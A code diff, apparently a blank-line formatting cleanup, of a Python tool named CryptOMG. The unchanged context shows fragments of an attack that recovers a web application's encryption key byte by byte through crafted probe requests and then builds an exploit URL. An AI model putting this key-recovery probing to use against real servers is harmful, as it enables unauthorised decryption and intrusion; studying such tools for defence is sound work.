@@ -13,7 +13,6 @@ def byte_xor(ba1, ba2):
 
 
 def repeated_key_xor(pt, key):
-
     len_key = len(key)
     encoded = []
     for i in range(0, len(pt)):
@@ -51,7 +50,6 @@ class CryptOMG:
         terminal=None,
         mthlock=None,
     ):
-
         self.solved_blocks = []
         self.current_pos = 0
         self.request_count = 0
@@ -80,14 +78,12 @@ class CryptOMG:
             self.proxy = None
 
         if knownkey:
-
             if len(self.knownkey) >= self.length:
                 self.finalkey = self.knownkey
             else:
                 self.solved_blocks = [self.knownkey[i : i + 4] for i in range(0, len(self.knownkey), 4)]
 
     def msgPrint(self, msg, style="normal"):
-
         now = datetime.now()
         self.terminal.log_messages.append((msg, style, now.strftime("%H:%M:%S")))
         self.terminal.log_messages_draw()
@@ -123,7 +119,6 @@ class CryptOMG:
             return
 
     def generate_payload(self):
-
         if self.handler == "SP":
             self.msgPrint("Skipping version check / payload URL generation since handler is SpellCheckHandler")
             self.terminal.exploit_url_draw()
@@ -165,7 +160,6 @@ class CryptOMG:
         return
 
     def versionProbe(self, fullurl, version):
-
         headers = {}
         if self.cookie:
             headers["cookie"] = self.cookie
@@ -179,7 +173,6 @@ class CryptOMG:
         return r
 
     def solveBlock(self):
-
         prefix = b"".join(self.solved_blocks)
         block = Block(self.url, prefix, self)
         block.find_baseline()
@@ -217,7 +210,6 @@ class Block:
         self.pos4 = KeyPosition(4, self)
 
     def sendProbe(self, randBytes, additionalParams=None):
-
         self.parent.detector_byte = randBytes.hex()
         self.parent.request_count += 1
         self.parent.terminal.footer_draw()
@@ -236,7 +228,6 @@ class Block:
             r = requests.get(fullUrl, headers=headers, verify=False, proxies=self.parent.proxy)
 
         elif self.parent.handler == "SP":
-
             fullUrl = f"{str(self.url)}"
             data = {
                 "DictionaryLanguage": "en-US",
@@ -332,7 +323,6 @@ class Block:
         test_chars = [b"\x00", b"\x6b", b"\x08"]
 
         for i in itertools.product(test_chars, repeat=4):
-
             if self.sendProbe(b"".join(i)):
                 self.baseline = b"".join(i)
                 self.parent.msgPrint(f"Found detector byte baseline: [{self.baseline}]")
@@ -355,7 +345,6 @@ class KeyPosition:
             self.possible_values.append(i)
 
     def solve_byte(self):
-
         if self.parent.parent.kill:
             raise WindowQuitException
 
@@ -388,7 +377,6 @@ class KeyPosition:
                         fullprobe_list[1] = self.parent.pos2.solved ^ 65
                         fullprobe_list[2] = intProbe
                     elif self.pos == 4:
-
                         fullprobe_list[0] = self.parent.pos1.solved ^ 65
                         fullprobe_list[1] = self.parent.pos2.solved ^ 65
                         fullprobe_list[2] = self.parent.pos3.solved ^ 65
@@ -417,7 +405,6 @@ class KeyPosition:
                     break
 
     def findSplittingProbe(self):
-
         split_dict = {}
         distance_dict = {}
         for b2 in range(256):
@@ -425,7 +412,6 @@ class KeyPosition:
             bucket2 = []
 
             for i in self.possible_values:
-
                 decrypted = i ^ b2
                 if isB64Character(chr(decrypted)):
                     bucket1.append(i)
